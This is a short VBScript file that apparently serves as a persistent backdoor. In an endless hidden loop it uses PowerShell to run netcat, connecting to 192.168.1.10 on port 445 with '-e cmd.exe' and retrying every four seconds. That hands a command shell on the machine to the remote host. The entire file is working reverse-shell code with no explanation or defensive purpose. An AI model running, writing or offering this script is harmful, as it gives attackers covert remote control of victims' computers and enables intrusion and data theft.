Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
		ncShell.Run "powershell.exe C:\nc\nc.exe 192.168.1.10 445 -e cmd.exe", 0, true
		WScript.Sleep(4000)
Loop
